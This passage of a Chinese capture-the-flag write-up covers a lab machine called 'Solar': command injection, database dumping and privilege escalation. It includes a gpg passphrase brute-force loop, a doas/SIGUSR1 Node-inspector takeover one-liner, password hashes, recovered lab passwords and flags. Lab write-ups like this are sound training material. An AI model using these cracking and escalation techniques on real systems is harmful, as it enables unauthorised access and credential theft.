            <!-- Login form -->
            <form method="post" action="">
                <!-- Username input -->
                <label for="username">Username</label>
                <input type="text" name="username" id="username" required>

                <!-- Password input -->
                <label for="password">Password</label>
                <input type="password" name="password" id="password" required>

                <!-- Submit button -->
                <input type="submit" value="Login">
            </form>

            <!-- Footer link to the main site -->
            <div class="footer-link">
                <p>Not an admin? <a href="/">Return to Solar Community Forum</a></p>
            </div>
        </div>
    </body>

    </html>
    <?php
}
?>
```


>有用户和密码，需要进行操作和添加新的消息回显
>

![图 88](../assets/images/321347fd4a3315e99ff0ea258dc163b0d0e1d9caba5c389105e97b684f1721a0.png)  
![图 89](../assets/images/1d22f3847916ea3ba67c4ad344d1aecc99f922fbcd302d0cbd4c537e76f95988.png)  

>可以看到真的在进行命令注入
>

![图 90](../assets/images/8f737a4372f1b2afaab4b0bc7695ec05b19c36ec105b293dac07980d62287f3a.png)  
![图 91](../assets/images/ba3f8ce33f50318fa6deba682a2880893e9426eb9b84e75ee678c8f6e7003169.png)  
![图 92](../assets/images/9cf2018fdb1437ce1cb8d290c95db7a0d6905ee10ae4354c834fb03d197f95fe.png)  
![图 93](../assets/images/22f684de661c753b36871460ef1eab01c5c6912c267b6ba64497b5faa6b7b637.png)  
![图 94](../assets/images/3319b3700dbe5c46efa25c2357b7bd25b41935fd22f0eba7431dd8ba410e2dba.png)  
![图 96](../assets/images/253dc7d425a36a91c05af172f4d7942d8d6162184d7072baf3baa4464cca7788.png)  
![图 97](../assets/images/9d12dadefb0b38e9409079be8b74eb6f4626703e2cfef69cdab58eff1ecf31d3.png)  
![图 98](../assets/images/830324df8f3b1be415ab27c9d8d74ea09202413382305c3fc25aea918996d4da.png)  
![图 99](../assets/images/4aaa2f99248661755f4dceb1a02da444366d3adeea2effc2e9d70f610e1097cf.png)  
![图 100](../assets/images/78ae94675891f8ce25f89b22916bf1e16f48f2cd826286d94ea7e5a069b08ead.png)  
![图 101](../assets/images/c44170e1e5c460059e2abbc245089c190c5803f56cc8ebec1c1d67847d03ed55.png)  

>没有nc wegt busybox，只有curl，具体的操作就只有curl一个命令执行了
>

![图 102](../assets/images/6e1510d14ab0760bbc584246cb1c475c2a8d8ecccfaa996201ea618e2c676ec5.png)  
![图 103](../assets/images/f92f2bcf62dd4e77b9a75b6afb080a91cf25c4d9adb341b920fac45b877380fe.png)  
![图 104](../assets/images/d8e024c539e887e105264f0ce6390903e01e26fc18d416f5cb4c0a294bb17c50.png)  
![图 105](../assets/images/573851e7bff05915f70fd68997bd25f7b68d9088f6f124049ac089e05445370d.png)  

>没弹回来应该是写错命令的问题重新来了
>

![图 106](../assets/images/5ef8e8da08b66d33627cceb5070a597748d178ca5a51d9d52a3b63d9b092433e.png)  
![图 107](../assets/images/d6c240e4848aa0afa775fa342790286aa50e90ba17d59d10bc6737e279907086.png)  

>总算弹回来了是-o的问题
>


## 提权
![图 108](../assets/images/a2769aca98e1bb3fed602d468cca94c6883d8d188cf182af0afd1077c8bec275.png)  
![图 109](../assets/images/9d50b5f29e45fe55ec4cbe10e2291d514a9453adc550260b9bd7dbe347aa79be.png)  

>啥也没有，三个选择了，找密码，定时任务，或者某个内置信息
>


```
www-data@solar:/home/julian$ ls -al
total 436
drwxr-xr-x 9 julian julian   4096 Sep  4 21:36 .
drwxr-xr-x 4 root   root     4096 Aug 28 19:01 ..
lrwxrwxrwx 1 root   root        9 Aug 28 19:04 .bash_history -> /dev/null
-rw-rw---- 1 julian julian    220 Apr 23  2023 .bash_logout
-rw-rw---- 1 julian julian   3526 Apr 23  2023 .bashrc
drwxrwx--x 4 julian julian   4096 Aug 28 19:27 .cache
drwxrwx--x 3 julian julian   4096 Aug 28 19:16 .config
drwxrwx--x 3 julian julian   4096 Sep  4 11:35 .gnupg
-rw------- 1 julian julian     20 Sep  4 11:05 .lesshst
drwxrwx--x 4 julian julian   4096 Sep  1 18:34 .local
lrwxrwxrwx 1 root   root        9 Aug 28 19:05 .mysql_history -> /dev/null
-rw-rw---- 1 julian julian     16 Aug 29 19:45 .node_repl_history
drwxrwx--x 3 julian julian   4096 Aug 28 19:16 .npm
drwxrwx--x 5 julian julian   4096 Aug 28 19:15 .nvm
drwxrwx--x 3 julian julian   4096 Aug 28 19:16 .pki
-rw-rw---- 1 julian julian    904 Sep  4 18:11 .profile
-rw------- 1 julian julian 386348 Sep  4 12:22 my-pass.jpg
www-data@solar:/home/julian$ ls -al /home/
julian/ lenam/  
www-data@solar:/home/julian$ ls -al /home/lenam/
total 52
drwxr-xr-x 6 lenam lenam 4096 Sep  4 05:55 .
drwxr-xr-x 4 root  root  4096 Aug 28 19:01 ..
lrwxrwxrwx 1 root  root     9 Jun 10  2024 .bash_history -> /dev/null
-rw-rw---- 1 lenam lenam  220 Jun 10  2024 .bash_logout
-rw-rw---- 1 lenam lenam 3578 Aug 28 20:08 .bashrc
drwxrwx--x 4 lenam lenam 4096 Sep  4 04:47 .gnupg
lrwxrwxrwx 1 lenam lenam    9 Aug 29 19:44 .lesshst -> /dev/null
drwxrwx--x 3 lenam lenam 4096 Jul 13  2024 .local
lrwxrwxrwx 1 root  root     9 Jun 28  2024 .mysql_history -> /dev/null
-rw-rw---- 1 lenam lenam   48 Aug 28 01:06 .nanorc
-rw-rw---- 1 lenam lenam    9 Sep  4 05:55 .node_repl_history
drwxrwx--x 4 lenam lenam 4096 Aug 29 19:27 .password-store
-rw-rw---- 1 lenam lenam  807 Jun 10  2024 .profile
drwxrwx--x 2 lenam lenam 4096 Aug 27 19:35 .ssh
-rw-rw---- 1 root  lenam   80 Sep  4 04:12 note.txt
-rw-rw---- 1 root  lenam   33 Jul 13  2024 user.txt
```

>好像是藏东西了
>

![图 110](../assets/images/bef5d45408cadfab88cecd2d5a7c623e6cd16641e372b8f9a65f13a7d216093f.png)  

>服啦，没有一个对我来说能看的
>

![图 111](../assets/images/9e7c3b6ec3aaca043ed41191a11d5334f0d3cb8852a7b2530564f6b29af78f3c.png)  

>这密码不知道有没有用
>
![图 112](../assets/images/8055e4d3b98eb47768ad12e4081b1bfb12d0f55aa991659295159fc1b3ce6ee1.png)  

>想多了，唯一线索是数据库了
>

![图 113](../assets/images/9604c1ad5d3b5f70e0b4748925638d9317f653e9849f37e46500b5b6ca1a13ff.png)  
![图 114](../assets/images/b31e05b9ab9db321651c42a205d690404a9a58ecbade81ce4522d865eee0f54f.png)  


```
-- MariaDB dump 10.19  Distrib 10.11.6-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: solar_energy_db
-- ------------------------------------------------------
-- Server version       10.11.6-MariaDB-0+deb12u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(64) NOT NULL,
  `role` varchar(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES
(1,'Robert24','66dc8ac996672de0cdeb294808d4cca21ba0bc856c365e90562565853febed0c','user'),
(2,'calvin','e8e9689deac5bac977b64e85c1105bd1419608f1223bdafb8e5fbdf6cf939879','user'),
(3,'JulianAdm','bbca1b30190fddeead4e1a845ee063bec94499601aa5ee795da8917767bdcdde','admin'),
(4,'John20','38858f3066c9a6f3d8c6e54fbfcff204d5383f0721c32bc8ae46cf46a93e3694','user');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-08-24 21:17:08
```


![图 115](../assets/images/26a6c3a1d6a6b9c1fa6c83817aa8701d99e6a172400f303920fe34409dd1c931.png)  
![图 116](../assets/images/c9c4dc346983398fcbbe228a4f107a5a60eb8f0a817cd16af9cb72670794e57c.png)  

![图 117](../assets/images/e77f06a37ca7aea2bd87c61b21ae98179f55980945500faec211fc369513c2a8.png)  

>跑密码无果，用工具了目前来说我已经手动找不了任何信息了
>

![图 118](../assets/images/6cca5a2507d2d8a5529c97bd73eb80ca593949adeb1c5627ffbc9feb460ce305.png)  

>还有信息没看，可以看一下
>

![图 119](../assets/images/60f12e80d175e1d48340286b806afbbbbe91bc4b6d7397608174d683caa798f0.png)  
![图 120](../assets/images/f936d3aa6db1688edc3e9c9deea18a33f389c7f8df205ac369fdefe663ff310a.png)  
![图 121](../assets/images/34eca596e82799c9a947f783723c61e85ecb60bc87b6f143cad81279ba09c390.png)  
![图 122](../assets/images/b41a80dbfab198622fb6f6153a597e3b521c0ecbd25ea80fb7ce8cdbdbafc466.png)  
![图 123](../assets/images/fc0e2a4d8d1ece486ed64ecba4057286f5d6c6166ac355c77f2a1d22d5bcbbf8.png)  

>有想搁置的冲动了，好难啊，光看进程我就已经找不到下一步的路了，没看懂问一下gtp了
>

```
从日志内容来看，这是一系列与 Puppeteer 和 Chrome 相关的命令行记录，显示了在 Linux 系统上运行的 Chrome 浏览器进程及其相关参数。以下是对这些日志内容的简要分析：
1. Puppeteer 和 Chrome 的使用场景
Puppeteer 是一个 Node.js 库，用于通过 DevTools 协议控制 Chrome 或 Chromium 浏览器。它常用于自动化测试、爬虫、生成网页截图等任务。
日志中提到的 --headless=new 表明 Chrome 是以无头模式（Headless Mode）运行的，这意味着浏览器在没有图形界面的情况下运行，适合服务器环境或自动化任务。
--remote-debugging-port=47000 表示启用了远程调试功能，允许 Puppeteer 通过 WebSocket 连接到 Chrome 并控制它。
2. Chrome 的启动参数
--disable-dev-shm-usage：禁用 /dev/shm，通常用于解决 Linux 系统中共享内存不足的问题。
--noerrdialogs：禁用错误对话框，避免在自动化过程中弹出干扰。
--mute-audio：静音音频输出。
--ignore-certificate-errors：忽略 SSL 证书错误，这在测试环境中很常见。
--user-data-dir=/tmp/puppeteer_dev_chrome_profile-gd924T：指定 Chrome 的用户数据目录，用于存储临时配置和缓存。
3. 进程类型
--type=renderer：表示渲染进程，负责渲染网页内容。
--type=gpu-process：表示 GPU 进程，用于处理图形渲染任务。
--type=utility：表示辅助进程，例如网络服务或存储服务。
--type=broker 和 --type=zygote：这些是 Chrome 的内部进程，用于进程间通信和管理。
4. 安全和调试相关参数
--enable-crash-reporter 和 --crashpad-handler-pid：与崩溃报告相关的参数，用于收集和报告崩溃信息。
--change-stack-guard-on-fork=enable：启用堆栈保护机制，增强安全性。
--disable-breakpad：禁用 Breakpad，一个轻量级的崩溃报告工具。
5. 其他关键信息
操作系统：从 annotation=lsb-release=Debian GNU/Linux 12 (bookworm) 可知，系统为 Debian 12。
Chrome 版本：ver=126.0.6478.126 表示 Chrome 的版本为 126.0.6478.126。
Node.js 版本：/home/julian/.nvm/versions/node/v22.7.0/bin/node 表示使用了 Node.js 22.7.0 版本。
6. 可能的问题或用途
这些日志可能是在运行一个基于 Puppeteer 的自动化脚本（如 login.js）时生成的。
如果出现错误或异常，这些日志可以帮助调试问题，例如检查 Chrome 的启动参数是否正确，或者是否存在资源限制（如 /dev/shm 的使用）。
```


>解决不了继续看wp了，这里需要利用doas，这个我没见过，我还是太菜了不过信息都找到了
>

![图 124](../assets/images/f1282446cfd947f6597cfd4af8c52cf2eabbdbe68c19144c631f40efbbda985f.png)  


```
www-data@solar:/home/lenam$ doas -u lenam /usr/bin/mosquitto_pub  --help
mosquitto_pub is a simple mqtt client that will publish a message on a single topic and exit.
mosquitto_pub version 2.0.11 running on libmosquitto 2.0.11.

Usage: mosquitto_pub {[-h host] [--unix path] [-p port] [-u username] [-P password] -t topic | -L URL}
                     {-f file | -l | -n | -m message}
                     [-c] [-k keepalive] [-q qos] [-r] [--repeat N] [--repeat-delay time] [-x session-expiry]
                     [-A bind_address] [--nodelay]
                     [-i id] [-I id_prefix]
                     [-d] [--quiet]
                     [-M max_inflight]
                     [-u username [-P password]]
                     [--will-topic [--will-payload payload] [--will-qos qos] [--will-retain]]
                     [{--cafile file | --capath dir} [--cert file] [--key file]
                       [--ciphers ciphers] [--insecure]
                       [--tls-alpn protocol]
                       [--tls-engine engine] [--keyform keyform] [--tls-engine-kpass-sha1]]
                       [--tls-use-os-certs]
                     [--psk hex-key --psk-identity identity [--ciphers ciphers]]
                     [--proxy socks-url]
                     [--property command identifier value]
                     [-D command identifier value]
       mosquitto_pub --help

 -A : bind the outgoing socket to this host/ip address. Use to control which interface
      the client communicates over.
 -d : enable debug messages.
 -c : disable clean session/enable persistent client mode
      When this argument is used, the broker will be instructed not to clean existing sessions
      for the same client id when the client connects, and sessions will never expire when the
      client disconnects. MQTT v5 clients can change their session expiry interval with the -x
      argument.
 -D : Define MQTT v5 properties. See the documentation for more details.
 -f : send the contents of a file as the message.
 -h : mqtt host to connect to. Defaults to localhost.
 -i : id to use for this client. Defaults to mosquitto_pub_ appended with the process id.
 -I : define the client id as id_prefix appended with the process id. Useful for when the
      broker is using the clientid_prefixes option.
 -k : keep alive in seconds for this client. Defaults to 60.
 -L : specify user, password, hostname, port and topic as a URL in the form:
      mqtt(s)://[username[:password]@]host[:port]/topic
 -l : read messages from stdin, sending a separate message for each line.
 -m : message payload to send.
 -M : the maximum inflight messages for QoS 1/2..
 -n : send a null (zero length) message.
 -p : network port to connect to. Defaults to 1883 for plain MQTT and 8883 for MQTT over TLS.
 -P : provide a password
 -q : quality of service level to use for all messages. Defaults to 0.
 -r : message should be retained.
 -s : read message from stdin, sending the entire input as a message.
 -t : mqtt topic to publish to.
 -u : provide a username
 -V : specify the version of the MQTT protocol to use when connecting.
      Can be mqttv5, mqttv311 or mqttv31. Defaults to mqttv311.
 -x : Set the session-expiry-interval property on the CONNECT packet. Applies to MQTT v5
      clients only. Set to 0-4294967294 to specify the session will expire in that many
      seconds after the client disconnects, or use -1, 4294967295, or ∞ for a session
      that does not expire. Defaults to -1 if -c is also given, or 0 if -c not given.
 --help : display this message.
 --nodelay : disable Nagle's algorithm, to reduce socket sending latency at the possible
             expense of more packets being sent.
 --quiet : don't print error messages.
 --repeat : if publish mode is -f, -m, or -s, then repeat the publish N times.
 --repeat-delay : if using --repeat, wait time seconds between publishes. Defaults to 0.
 --unix : connect to a broker through a unix domain socket instead of a TCP socket,
          e.g. /tmp/mosquitto.sock
 --will-payload : payload for the client Will, which is sent by the broker in case of
                  unexpected disconnection. If not given and will-topic is set, a zero
                  length message will be sent.
 --will-qos : QoS level for the client Will.
 --will-retain : if given, make the client Will retained.
 --will-topic : the topic on which to publish the client Will.
 --cafile : path to a file containing trusted CA certificates to enable encrypted
            communication.
 --capath : path to a directory containing trusted CA certificates to enable encrypted
            communication.
 --cert : client certificate for authentication, if required by server.
 --key : client private key for authentication, if required by server.
 --keyform : keyfile type, can be either "pem" or "engine".
 --ciphers : openssl compatible list of TLS ciphers to support.
 --tls-version : TLS protocol version, can be one of tlsv1.3 tlsv1.2 or tlsv1.1.
                 Defaults to tlsv1.2 if available.
 --insecure : do not check that the server certificate hostname matches the remote
              hostname. Using this option means that you cannot be sure that the
              remote host is the server you wish to connect to and so is insecure.
              Do not use this option in a production environment.
 --tls-engine : If set, enables the use of a TLS engine device.
 --tls-engine-kpass-sha1 : SHA1 of the key password to be used with the selected SSL engine.
 --tls-use-os-certs : Load and trust OS provided CA certificates.
 --psk : pre-shared-key in hexadecimal (no leading 0x) to enable TLS-PSK mode.
 --psk-identity : client identity string for TLS-PSK mode.
 --proxy : SOCKS5 proxy URL of the form:
           socks5h://[username[:password]@]hostname[:port]
           Only "none" and "username" authentication is supported.

See https://mosquitto.org/ for more information.
```

![图 125](../assets/images/f71a6d40ea7658c24b2bba759359a2e755176501b69437a44e6717eea82ad774.png)  

>奥还是mqtt，发送信息任务，那我懂了具体就发给刚刚的用户就好了
>

![图 126](../assets/images/861988e047c350650ff0be4afcb0de2b05266d938c5beed4c4055f78545e3d67.png)  
![图 127](../assets/images/048693bdb63824eb4daf8c0cbb0fec534c1daa5a489726cc9581166275bf7b15.png)  

>又是这个那我知道为啥没有id_rsa
>

![图 128](../assets/images/d31ca7f5b44d95115bef35c99a4d3991f4f023c69e403917de8826692c3b67de.png)  
![图 129](../assets/images/377f201f578c890a64852fc6ba5771814389054e2ed07ecb3dc99cf39628844b.png)  
![图 130](../assets/images/d5142423e731aecad2a1c70f0307f85ff25b94ac23bbe77bd892c78291382038.png)  

>要密码不知道能不能爆破出来
>

![图 131](../assets/images/5f2117636ec08d44cb433b7eaa44322e8c51815c50d27242b91cbbfa2e96edbb.png)  
![图 132](../assets/images/396600628af3fd060b97e27067f1d1bcde4564edb280c84f187ad4aabdcf0d18.png)  
![图 133](../assets/images/87728bacfd19aeba805c78c235074c43c4bc6ccc5697164ba621498f61272eab.png)  

>看wp的方向是这个并且在local/share里面
>

![图 134](../assets/images/0e4135ba561ba5d6f5f12b0eb929dc00dca32d7989d29104b31380d4af51992b.png)  
![图 135](../assets/images/cb8aeaf84b269aeaaaa836331c6383846308f9c8798e211283934fb38e678a10.png)  
![图 136](../assets/images/29cbcf4cabd23d628df578bc96084e0d65948dd6c78e51d30ab276a4c16948c0.png)  
![图 137](../assets/images/4ccfa32a18052cb189dec477d569c1b6e13cc30fe48954dc024bc21601034761.png)  
![图 138](../assets/images/c8eeab701a2e15efe0af340300d1e27d572c08614a17e7a5dd30ba23ddea6d4d.png)  

>服气真不看wp根本进行不下去，算了我觉得都看怎么多地方了也不差最后一点的wp了，这个靶机非常牛逼，不亏是hard
>

![图 139](../assets/images/0ea4677e922bf2b26022502e2304807f5d485bf01ee743676f0c392fc5470008.png)  
![图 141](../assets/images/8f94b5b070e1f5c0e0885e46b65a8fa7adf0f73f17b237d83b912ef60726ab89.png)  
![图 140](../assets/images/9a9b361b79dbf35717bf0313c545dc9ffa2c9d70a047823486874efe3761b9be.png)  


```
for i in $(cat lover.txt);do echo $i| gpg --batch --passphrase-fd 0 --pinentry-mode loopback --decrypt .password-store/work/office.gpg &>/dev/null; [[ $? == 0 ]] && echo "[+]$i" && break ;done
[+]loverboy1

grep -Pr '^love[^ ]*[^0-9][0-9]$' /usr/share/wordlists/rockyou.txt > lover.txt
```

>问就是我太菜了只能拿别人的方案
>

![图 142](../assets/images/7ef2756dbcb7a99753cc4587987945d84d55ff3d75e5ee089874d35accd71c3c.png)  
![图 143](../assets/images/b94d1e5ee0612ac5e89026cc86dd252da5399445409bb50deda289fc783abdb7.png)  

>密码有： d1NpIh1bCKMx CzMO48xpwof8nvQ6JUhF qiFQI7buDp7zIQnAymEY
>

![图 144](../assets/images/c4c56099491c4a07a6f2a8fa60541fab62566107acb690fc485e160fa052a684.png)  

>都没对是什么东西？
>

![图 121](../assets/images/34eca596e82799c9a947f783723c61e85ecb60bc87b6f143cad81279ba09c390.png) 

>需要对照这个做，目前发现kill的输入密码好像是lenam这个用户，确实密码为：qiFQI7buDp7zIQnAymEY
>

![图 145](../assets/images/a6e8341f3cc14d03d4442b2d6c6f03f4433864d5139a8a9016b852657a4de915.png)  
![图 146](../assets/images/bed2c30628f1701ce86a6e7f0ddc649ffdc2df2537e33dd1a318500a55e9f24f.png)  

>看进程的是用node这个
>

![图 147](../assets/images/81e716e7f473859f8082b38f11745c5bf41f2e99bbef32cb93802450bef28950.png)  

>是变化的所以利用配对进行过滤，按第一个来
>
![图 148](../assets/images/77c390ea557b77dcbbc3f661d6ec550efa4e16c716147678802087674bf5c1f4.png)  
![图 149](../assets/images/57c51e9c58d7f42a98c1a6c264220788b59bc2aae1fbc8cb688e0a7a3cc77a61.png)  

>是这个利用方案么，我先试试看
>
![图 150](../assets/images/4081a5908a5ed2da46278129cba9cd7e9144a1129e26950b1db33a70682052c0.png)  
![图 151](../assets/images/0904da7ff4521ea154157ac44262c9bb23f636799d15daba7e0d9fc540779ee1.png)  

>这个才是地址为：https://nodejs.cn/api/process/process_kill_pid_signal.html
>地址：https://nodejs.org/en/learn/getting-started/debugging
>

![图 152](../assets/images/4592f78397e8cd44117fe33dac6f86a317e91fd1e93090fed6ff0e47d0cb2a98.png)  

![图 153](../assets/images/c8daf36a3d371326d7ff2858f905e109d21ac9b8f9368943a07740befc4e6346.png)  


```
uid=$(ps -ef|grep node|head -1 |awk -F ' ' '{print $2}');doas -u julian /bin/kill -s SIGUSR1 $uid && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect 127.0.0.1:9229
```


![图 154](../assets/images/efbe3355156d4c72765d54209a4ac02f581a620454eed1a49b72a621be2b4737.png)  
![图 155](../assets/images/bed0650c1fb72d09ff6f80183286938dca6924c8fa5cdf3e1c640b81d17d5c68.png)  
![图 156](../assets/images/a68d9a1bf020d67087740e5f560dec05cad93e0a5c8e1571089792ec51407c4b.png)  
![图 157](../assets/images/231c05805423cee6b4307c18a0079a6a967eb240c4aabbeb45978de9beef4bde.png)  

>之前debug被干掉了
>

![图 159](../assets/images/d7d44d4c64397566541fc7b9dd35acc7e67be4d8e917b26c225813aa0512075c.png)  

![图 158](../assets/images/9393316187e032d323a7a2dda146e76d09039cef7141b18086d2d4034be83248.png)  
![图 160](../assets/images/ccedb04b92cff0bff79bbde23f80670569b826723baaf26e985598f59a36175e.png)  

>My password: tk8QaHUi3XaMLYoP1BpZ
>

![图 161](../assets/images/cce5399e3a911869636a743495837cf87ee560d77a748cdd035784cb25d7a498.png)  

>最后一个了快结束了
>

![图 162](../assets/images/792d70d98d7aa606daae03be65bd4aca5aa877135b1641e4f8c618a1f7ad088a.png)  

>利用这个数据库干什么东西，不过有一个异或的东西，看wp利用动态调试，不过呢很明显我不会我顶多debug爆炸，所以我直接tools解一下，非常好没爆破出xor，看wp的方案
>

![图 163](../assets/images/d45c2d976e939ca3df65a69fa71d6f826b8d6901c9c3abf6a8f4df6cbce8e7ed.png)  
![图 164](../assets/images/83288689e2aa551764def6e0105f8678b50b9a0d4d107d7a2a8b9a587072c8b9.png)  


>理解一下首先会做的事情就是解压这个数据库的啥玩意后面会删除，我们现在是有环境变量的所以直接劫持rm，
>

![图 166](../assets/images/6b9722f9f7445649e0071270d6cfa1e7cec476f9162af37b72cfe244c6095356.png)  

![图 165](../assets/images/c4c27824f6c7564287fa10fdab696d43748492969739943c9c81fd175a424b96.png)  
![图 167](../assets/images/a5345e41c61582de06c4cd7325b65da078fd6ec3c11556b4bf90fc3fbdf68ec9.png)  
![图 168](../assets/images/f40ff9b0945c31af5f1f7e66102665bd04b4b2c89f904ed3a3f8a20407a3873b.png)  
![图 170](../assets/images/00533ab3d5ac5471157ed39730343fc4bfdd0385aeb2104ca7e0290053d0b986.png)  

![图 169](../assets/images/ea33a1fd803dc5efd86a621adc12709c378cf898da43ec9715dafd06d20a67f9.png)  

![图 171](../assets/images/b21c19da7411d466f229d17996988036da9fc6fa4fd63993656f89a5ee4e339e.png)  

>终于结束了，真难啊
>

>userflag:c25e7b68dd71d1ca9d8f86da2df12035
>
>rootflag:44d981ce629f2077103ed9dc70d635f5
>